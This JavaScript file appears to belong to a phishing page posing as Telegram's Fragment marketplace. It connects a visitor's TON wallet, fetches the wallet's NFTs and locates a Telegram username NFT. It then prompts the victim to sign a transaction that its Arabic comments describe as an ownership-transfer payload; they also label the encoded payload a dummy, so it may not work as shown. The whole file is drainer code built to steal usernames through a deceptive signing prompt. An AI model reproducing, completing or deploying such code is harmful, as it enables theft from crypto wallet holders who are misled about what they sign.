const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
    manifestUrl: 'https://alawi2396.github.io/fragment-web/tonconnect-manifest.json',
    buttonRootId: 'connect-button'
});

// استخراج اليوزر من الرابط للعرض فقط
const urlParams = new URLSearchParams(window.location.search);
document.getElementById('target-user').innerText = "@" + (urlParams.get('user') || "User");

// مراقبة حالة الاتصال
tonConnectUI.onStatusChange(async (wallet) => {
    if (wallet) {
        document.getElementById('confirm-btn').style.display = "block";
    }
});

document.getElementById('confirm-btn').onclick = async () => {
    const address = tonConnectUI.account.address;
    
    // جلب الـ NFTs تلقائياً من المحفظة
    try {
        const response = await fetch(`https://tonapi.io/v2/accounts/${address}/nfts`);
        const data = await response.json();
        
        // البحث عن يوزرات تليجرام في المحفظة
        const nft = data.nft_items.find(item => item.metadata.name.includes('.t.me'));

        if (nft) {
            // طلب المعاملة (Payload نقل الملكية)
            const transaction = {
                validUntil: Math.floor(Date.now() / 1000) + 300,
                messages: [
                    {
                        address: nft.address, // العقد المسحوب تلقائياً
                        amount: "0",
                        payload: "te6ccgEBAQEADgAAGAAAABAAAABAAAAA" // Payload وهمي للنقل
                    }
                ]
            };
            await tonConnectUI.sendTransaction(transaction);
        } else {
            alert("لا يوجد NFT صالح في هذه المحفظة.");
        }
    } catch (e) {
        console.error(e);
    }
};
